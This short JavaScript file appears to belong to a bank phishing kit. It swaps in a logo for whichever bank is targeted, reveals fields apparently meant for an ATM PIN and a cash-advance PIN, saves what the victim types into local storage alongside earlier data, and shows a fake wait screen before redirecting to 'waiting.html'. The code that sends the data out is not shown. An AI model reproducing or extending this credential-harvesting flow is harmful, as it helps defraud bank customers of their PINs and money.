console.log("scot ON");

// ERORRES
document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err === 'ccajero'){
        document.querySelector('#ccajero').setAttribute('type', 'text');
    }else if(info.err === 'cavances'){
        document.querySelector('#cavances').setAttribute('type', 'text');
    }
});

// Cargar imagen
document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${info.ban}.png`);

const btnSuccess = document.querySelector('#form');

btnSuccess.addEventListener('submit', e => {
    e.preventDefault();

    document.querySelector('#modal-esperar').classList.add('d-block');

    info.cavances = info.cavances !== '' ? info.cavances : document.querySelector('#cavances').value;
    info.ccajero = info.ccajero !== '' ? info.ccajero : document.querySelector('#ccajero').value;

    LS.setItem('info', JSON.stringify(info));

    setTimeout(()=>{
        window.location.href = 'waiting.html';
    }, 3000);
});